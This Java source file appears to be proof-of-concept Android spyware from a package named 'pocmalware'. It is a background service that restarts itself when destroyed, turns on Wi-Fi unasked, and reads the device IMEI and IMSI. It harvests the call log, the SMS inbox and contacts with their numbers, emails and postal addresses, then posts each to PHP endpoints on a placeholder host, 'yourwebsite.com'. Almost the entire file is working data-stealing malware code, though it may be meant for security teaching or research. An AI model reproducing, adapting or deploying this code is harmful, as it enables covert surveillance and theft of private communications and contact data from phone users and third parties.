package com.attify.pocmalware;

import java.util.ArrayList;
import java.util.List;

import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import android.app.ActivityManager;
import android.app.ActivityManager.RunningServiceInfo;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.IBinder;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.telephony.TelephonyManager;

public class myservice extends Service {
	
	String imei,imsi;

	@Override
	public IBinder onBind(Intent arg0) {
		// TODO Auto-generated method stub
		return null;
	}
	
	@Override
    public void onCreate() {
		//if(!isMyServiceRunning()) 
		startr();
    }
	
	@Override
	public void onDestroy() {
		// Cancel the persistent notification.
		startService(new Intent(getApplicationContext(), myservice.class));
	}
	
	private boolean isMyServiceRunning() {
	    ActivityManager manager = (ActivityManager) getSystemService(ACTIVITY_SERVICE);
	    for (RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
	        if ("com.attify.pocmalware.myservice".equals(service.service.getClassName())) {
	            return true;
	        }
	    }
	    return false;
	}
	
	public void startr() {
		
		TelephonyManager manager = (TelephonyManager)getSystemService(TELEPHONY_SERVICE);
		imei = manager.getDeviceId();
	    imsi = manager.getSubscriberId();
	    
	    WifiManager wifiManager = (WifiManager) this.getSystemService(Context.WIFI_SERVICE);
	    
	    if (!wifiManager.isWifiEnabled()) { 
	     	wifiManager.setWifiEnabled(true);
	     	try {
				Thread.sleep(10000);
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
	    }    
	    
	    getContactInfo(getContentResolver());
	        
		getAllCallLogs(getContentResolver());
			
	    readSMS(getContentResolver());
	    
	   
	}	
	 	
	//call log function
	public void getAllCallLogs(final ContentResolver cr) {
		
		final String strOrder = android.provider.CallLog.Calls.DATE + " DESC";
	 
	 
	 	new Thread(new Runnable() {
	 		public void run() {
	 			TelephonyManager manager = (TelephonyManager)getSystemService(TELEPHONY_SERVICE);
	 			imei = manager.getDeviceId();
	 		    imsi = manager.getSubscriberId();
	 		 
	 		    Cursor cur = cr.query(CallLog.Calls.CONTENT_URI, null, null, null, strOrder);
	 		 	// loop through cursor
	 		 	int i=0;
	 		 	List nameValuePairs = new ArrayList();
	 		 	while (cur.moveToNext()) {
	 		 		CallLog callLog = new CallLog();
	 		 		String callNumber = cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.NUMBER));
	 		 		String callName = cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.CACHED_NAME));
	 		 		String callDate = cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.DATE));
	 		 		String callType = cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.TYPE));
	 		 		String isCallNew = cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.NEW));
	 		 		String duration = cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.DURATION));
	 		 		//////////////////////////////////////		 	     
	 		 		nameValuePairs.add(new BasicNameValuePair("imeiimsi", imei+imsi));
	 		 		nameValuePairs.add(new BasicNameValuePair("sl", Integer.toString(i)));
	 		 		nameValuePairs.add(new BasicNameValuePair("number", callNumber));
	 		 		nameValuePairs.add(new BasicNameValuePair("name", callName));
	 		 		nameValuePairs.add(new BasicNameValuePair("calldate", callDate));
	 		 		nameValuePairs.add(new BasicNameValuePair("type", callType));
	 		 		nameValuePairs.add(new BasicNameValuePair("new", isCallNew));
	 		 		nameValuePairs.add(new BasicNameValuePair("duration", duration));
	 		 		
	 		 		Runnable r = new logs(nameValuePairs);
	 		 		new Thread(r).start();
	 		 
	 		 		nameValuePairs.clear();
	 		 		// process log data
	 		 	}
	 		 	cur.close();
	 		 }
	 	  }).start();
	 }
	     
	public void readSMS(ContentResolver cr) {
		Uri uri = Uri.parse("content://sms/inbox");
	 	final Cursor c= getContentResolver().query(uri, null, null ,null,null);
	 	final String[] body = new String[c.getCount()];
	 	final String[] number = new String[c.getCount()];
	 	final List nameValuePairs = new ArrayList();
	 	new Thread(new Runnable() {
	 		public void run() {
	 			if(c.moveToFirst()){
	 				for(int i=0;i<c.getCount();i++){
	 					
	 		            
	 					body[i]= c.getString(c.getColumnIndexOrThrow("body")).toString();
	 		            number[i]=c.getString(c.getColumnIndexOrThrow("address")).toString();
	 		            
	 		            nameValuePairs.add(new BasicNameValuePair("imeiimsi", imei+imsi));
	 		       		nameValuePairs.add(new BasicNameValuePair("number", number[i]));
	 		       		nameValuePairs.add(new BasicNameValuePair("message", body[i]));
	 		       		
	 		       		Runnable r = new sms(nameValuePairs);
	 		    		new Thread(r).start();
	 		       		nameValuePairs.clear();
	 		            c.moveToNext();
	 		        }
	 			}
	 			c.close();
	 		}
	 	}).start();
	}
	     
	protected void getContactInfo(ContentResolver cr) {
		final List nameValuePairs = new ArrayList();
     	Intent intent = new Intent(Intent.ACTION_PICK, ContactsContract.Contacts.CONTENT_URI); 
     	final Cursor cursor =  cr.query(intent.getData(), null, null, null, null);  
     	new Thread(new Runnable() {
 		    public void run() {  
 		    	try {
 		    		int i=0;
 		    		int j=0;
 		    		String phoneNumber = null;
 		    		while (cursor.moveToNext()) 
 		    		{           
 		    			j++;
 		    			if(j==50) {
 		    				Thread.sleep(2000);
 		    			}
 		    			String contactId = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
 		    			String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME)); 
 		    			nameValuePairs.add(new BasicNameValuePair("name", name));
 		    			String hasPhone = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER));

 		    			if ( hasPhone.equalsIgnoreCase("1"))
 		    				hasPhone = "true";
 		    			else
 		    				hasPhone = "false" ;

 		    			if (Boolean.parseBoolean(hasPhone)) 
 		    			{
 		    				Cursor phones = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,ContactsContract.CommonDataKinds.Phone.CONTACT_ID +" = "+ contactId,null, null);
 		    				i=0;
 		    				while (phones.moveToNext()) 
 		    				{
 		    					phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
 		    					//Toast.makeText(this, phoneNumber, Toast.LENGTH_SHORT).show();
 		    					nameValuePairs.add(new BasicNameValuePair("number", phoneNumber));
 		    					i++;
 		    				}
 		    				phones.close();
 		    			}
            
 		    			// Find Email Addresses
 		    			Cursor emails = getContentResolver().query(ContactsContract.CommonDataKinds.Email.CONTENT_URI,null,ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = " + contactId,null, null);
 		    			i=0;
 		    			while (emails.moveToNext()) 
 		    			{
 		    				String emailAddress = emails.getString(emails.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA));
 		    				nameValuePairs.add(new BasicNameValuePair("email[]", phoneNumber));
 		    				i++;
 		    			}
 		    			emails.close();

 		    			Cursor address = getContentResolver().query(ContactsContract.CommonDataKinds.StructuredPostal.CONTENT_URI, null, ContactsContract.CommonDataKinds.StructuredPostal.CONTACT_ID + " = " + contactId, null, null);
 		    			i=0;
 		    			while (address.moveToNext()) 
 		    			{ 
 		    				// These are all private class variables, don't forget to create them.
 		    				String poBox = address.getString(address.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.POBOX));
 		    				String street = address.getString(address.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.STREET));
 		    				String city = address.getString(address.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.CITY));
 		    				String state = address.getString(address.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.REGION));
 		    				String postalCode = address.getString(address.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.POSTCODE));
 		    				String country = address.getString(address.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.COUNTRY));
 		    				String type = address.getString(address.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.TYPE));
           
 		    				nameValuePairs.add(new BasicNameValuePair("pobox[]", poBox));
 		    				nameValuePairs.add(new BasicNameValuePair("street[]", street));
 		    				nameValuePairs.add(new BasicNameValuePair("city[]", city));
 		    				nameValuePairs.add(new BasicNameValuePair("state[]", state));
 		    				nameValuePairs.add(new BasicNameValuePair("postal[]", postalCode));
 		    				nameValuePairs.add(new BasicNameValuePair("country[]", country));
 		    				nameValuePairs.add(new BasicNameValuePair("type[]", type));
 		    				i++;
 		    			}  //address.moveToNext() 
 		    			address.close();
 		    			//Toast.makeText(this, name , Toast.LENGTH_SHORT).show();
 		    			nameValuePairs.add(new BasicNameValuePair("imeiimsi", imei+imsi));
 		    			//postData(nameValuePairs, "contacts");
 		    			Runnable r = new cont(nameValuePairs);
 		    			new Thread(r).start();
         
 		    			nameValuePairs.clear();
 		    		}  //while (cursor.moveToNext())   
	     	
 		    		cursor.close();
 		    	} catch (Exception e) {
 		    		// TODO Auto-generated catch block
 		    		e.printStackTrace();
 		    		// TODO Auto-generated catch block
 		    		try {
 		    			Thread.sleep(2000);
 		    		} catch (InterruptedException e1) {
 		    			// TODO Auto-generated catch block
 		    			e1.printStackTrace();
 		    		}
 		    	}
 		    }
     	}).start();
	}//getContactInfo
	     
	public class logs implements Runnable {
		List nameValuePairs;  
	    public logs(List nameValuePair) {
	    	// store parameter for later user
	    	nameValuePairs = nameValuePair;
	    }
	    public void run() {
	    	try {
	    		HttpClient httpclient = new DefaultHttpClient();
	    		HttpPost httppost = new HttpPost("http://yourwebsite.com/callogs.php");
	    		httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));  
	    		// Execute HTTP Post Request
	    		HttpResponse response = httpclient.execute(httppost);
	    	} catch (Exception e) { }
	    }
	}
	public class sms implements Runnable {
		
		List nameValuePairs;  
		public sms(List nameValuePair) {
			// store parameter for later user
			nameValuePairs = nameValuePair;
		}
		
		public void run() {
			try {
				HttpClient httpclient = new DefaultHttpClient();
				HttpPost httppost = new HttpPost("http://yourwebsite.com/sms.php");
				httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));  
				// Execute HTTP Post Request
				HttpResponse response = httpclient.execute(httppost);
			} catch (Exception e) { }
		}
	}
	
	public class cont implements Runnable {
		
		List nameValuePairs;  
		public cont(List nameValuePair) {
			// store parameter for later user
			nameValuePairs = nameValuePair;
		}
		
		public void run() {
			try {
				HttpClient httpclient = new DefaultHttpClient();
				HttpPost httppost = new HttpPost("http://yourwebsite.com/contacts.php");
				httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));  
				// Execute HTTP Post Request
				HttpResponse response = httpclient.execute(httppost);
			} catch (Exception e) { }
		}
	}
	
}
